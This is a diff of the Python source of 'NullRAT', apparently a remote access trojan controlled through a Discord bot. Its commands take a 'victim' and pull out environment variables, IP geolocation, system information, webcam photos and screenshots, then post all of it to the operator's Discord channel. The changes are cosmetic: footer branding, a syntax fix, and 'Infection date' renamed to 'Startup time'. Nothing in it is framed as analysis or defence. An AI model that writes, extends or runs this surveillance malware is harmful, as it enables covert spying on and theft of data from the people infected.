@@ -14,7 +14,7 @@ original_dir = os.getcwd()
 client = commands.InteractionBot(test_guilds=server_ids)
 nr_working = f"C:\\Users\\{os.getenv('username')}\\.cache"
 
-if !os.path.isdir(nr_working):
+if os.path.isdir(nr_working) != True:
     os.mkdir(nr_working)
     
 @client.event
@@ -30,7 +30,7 @@ async def on_ready():
         icon_url=r"https://cdn.discordapp.com/attachments/959480539335766036/984699113734037544/embed_pfp2.png"
     )
     embed.set_footer(
-        text = f"Infection date:"
+        text = f"Startup time:"
     )
     await client.get_channel(notification_channel).send(embed=embed)
 
@@ -71,6 +71,8 @@ async def command(ctx, victim: str, environment: str):
             ).add_field(
                 name="Value for "+environment+" is:", 
                 value="```"+value+"```"
+            ).set_footer(
+                text = "NullRAT"
             )
         )
 
@@ -102,7 +104,8 @@ async def command(ctx, victim):
         embed.add_field( name="Zip code", value=data["zip"]       )
         embed.add_field( name="ISP",      value=data["isp"]       )
         embed.add_field( name="Timezone", value=data["timezone"]  )
-        
+        embed.set_footer(text = "NullRAT")
+
         await ctx.followup.send(embed=embed)
 
 
@@ -139,6 +142,8 @@ async def command(ctx, victim):
             embed=discord.Embed(
                 title="Image taken from webcam:", 
                 timestamp=datetime.now()
+            ).set_footer(
+                text="NullRAT"
             ), 
             file=discord.File(
                 nr_working + "\\image.png"
@@ -169,7 +174,12 @@ async def command(ctx, victim):
             stdin=subprocess.PIPE
         )
         await ctx.followup.send(
-            embed=discord.Embed(title="System Information:", timestamp=datetime.now()), 
+            embed=discord.Embed(
+                title="System Information:", 
+                timestamp=datetime.now()
+            ).set_footer(
+                text = "NullRAT"
+            ), 
             file=discord.File(nr_working + "\\youtube.txt", filename="systeminfo.txt"), 
         )
         time.sleep(2)
@@ -197,6 +207,8 @@ async def command(ctx, victim):
                 timestamp=datetime.now()
             ).set_image(
                 file = discord.File(nr_working + "\\monitor.png", filename='Screenshot.png')
+            ).set_footer(
+                text = "NullRAT"
             )
         )
         time.sleep(2)
